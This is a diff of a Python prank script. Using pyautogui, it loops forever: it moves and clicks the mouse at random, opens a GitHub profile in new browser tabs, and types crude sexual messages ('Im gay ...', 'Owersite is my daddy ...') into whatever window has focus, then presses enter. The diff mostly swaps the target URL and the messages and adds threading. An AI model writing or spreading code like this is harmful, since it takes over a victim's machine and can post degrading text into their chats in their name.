@@ -3,7 +3,7 @@ import pyautogui, random, os, threading, webbrowser
 width, height = pyautogui.size()
 
 def openwebsite():
-    url = "https://www.youtube.com/watch?v=bwD8G3a86p8"
+    url = "https://github.com/Owersite"
     webbrowser.open(url, new=2)
 
 def movecursor():
@@ -17,13 +17,13 @@ def clicking():
 
 def spammsg():
     pyautogui.write("Im gay ...")
-    pyautogui.write("I like to drink charon's cum ...")
+    pyautogui.write("Owersite is my daddy ...")
     pyautogui.press("enter")
 
 while True:
-    thread = threading.Thread(target=movecursor)
-    thread.start()
-    openwebsite()
-    movecursor()
+    thread1 = threading.Thread(target=movecursor)
+    thread1.start()
+    thread2 = threading.Thread(target=openwebsite)
+    thread2.start()
     spammsg()
     clicking()
